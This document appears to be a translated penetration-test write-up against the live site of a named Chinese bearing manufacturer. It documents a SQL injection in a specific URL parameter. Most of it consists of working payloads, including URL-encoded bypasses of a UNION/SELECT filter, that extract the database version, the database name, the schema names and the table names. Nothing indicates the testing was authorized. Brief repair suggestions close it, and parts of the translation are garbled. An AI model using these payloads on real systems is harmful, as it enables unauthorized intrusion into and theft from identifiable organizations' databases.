Penetration time: March 28th, 2023<br />Target: Zhejiang Jingjiu Bearing Industry Co., Ltd<br />Infiltration assets: [http://jjbearings.com/userabout.php?id=1](http://jjbearings.com/userabout.php?id=1)<br />Penetration tools: IE browser, Google browser<br />Vulnerability: SQL injection

<a name="a4FRS"></a>
## 1. Vulnerability discovery stage
Found triable parameters? id=1<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679987843653-589fda3f-2006-48b7-9f03-d13b932a35f4.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#from=url&id=wUUxR&originHeight=636&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)
<a name="xNGGB"></a>
## 2、Vulnerability verification stage
payload：<br />? Id=1 and 1=1 	# Returns correct<br />? Id=1 and 1=2 	# Error returned<br />Confirm that SQL injection exists and is a plastic injection<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679987915371-48f3b8c8-4897-48ab-b62e-53c022c0d351.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23ece8e6&from=url&id=pZClg&originHeight=639&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679987992425-4120778e-140d-49eb-bb44-7058339f6663.png#averageHue=%23f5f1f0&clientId=u6e2e0921-0f28-4&from=paste&height=598&id=uf1a6d2ab&name=image.png&originHeight=987&originWidth=1920&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=438953&status=done&style=none&taskId=ua1d4b1a5-2d1d-46d1-9104-4f8a4f9a8c4&title=&width=1163.636296379997)
<a name="M45DT"></a>
## 3. Further vulnerability verification stage
Guess the number of fields Payload:<br />? id=1 order by 2 	# Returns correct<br />? id=1 order by 3 	# Returns information that a field does not exist<br />Determine the number of database fields as 2<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988199231-b3ef528d-0a2d-428e-8c3c-f9115a323e2f.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#from=url&id=y64xZ&originHeight=633&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988175984-06c24025-2598-48cf-b7d0-b674b7c66e7a.png#from=url&id=vh8Jv&originHeight=995&originWidth=1920&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />After testing, it was found that union and select were filtered, and attempts to bypass case, double write, and% 00 truncation were not possible. The returned information was illegal access<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988291283-123cd2b2-a507-471a-b60d-b405565569d0.png#from=url&id=Q1rsB&originHeight=990&originWidth=1920&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />Attempt to bypass using url encoding<br />payload:<br />?id=-1%55nion%53eLEct 1,2					#The echo field is2<br />?id=-1%55nion%53eLEct 1，%56erSion（）		#5.1.73<br />?id=-1%55nion%53eLEct 1，%44atAbase（）	#hdm386770643_db<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988703550-44d53118-b18e-4f4d-80fb-247a75511d71.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23f6f1f1&from=url&id=xYmUw&originHeight=637&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988612161-e774a5a8-6444-46ac-9ae7-80713f1dc40a.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23f6f1f0&from=url&id=wmxew&originHeight=634&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679988635348-8a5bdcfa-0723-4c47-92dc-48c019863199.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23f6f1f1&from=url&id=ITy8q&originHeight=633&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />You can also query all the libraries of the current user<br />payload：<br />?id=-1  %55nion %53eLEct 1,(%53ELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1679989051197-06181ee4-496f-493f-9339-757716451924.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23f4f0f0&from=url&id=kRity&originHeight=643&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />You can also query information_ All forms under the schema<br />payload：<br />?id=-1  %55nion %53eLEct 1,(%53ELECT GROUP_CONCAT(table_name) FROM information_schema.tables)<br />![](https://cdn.nlark.com/yuque/0/2023/png/26811445/1680056605747-1da11bdc-adbd-45eb-b014-6b38d4895e49.png?x-oss-process=image%2Fresize%2Cw_1237%2Climit_0#averageHue=%23f2eeed&from=url&id=dCrgj&originHeight=634&originWidth=1237&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)
<a name="EK1xe"></a>
## 4. Repair suggestions
1. Determining the type or length of a parameter can avoid abnormal implantation in parameters.<br />2. Strictly control database permissions, use a dedicated account and password for the dedicated database, and do not use an administrator account, such as the root account of MySQL, the sa account of SQL <br />3, and the sa account of server. Do not use them in applications. The previous post explained in detail the steps for adding a dedicated account and granting permissions to the SQL server database.<br />4. Avoid responding directly to some SQL exception information. After an SQL exception occurs, customize the exception to respond. At the same time, keep database operation logs to track and identify issues.
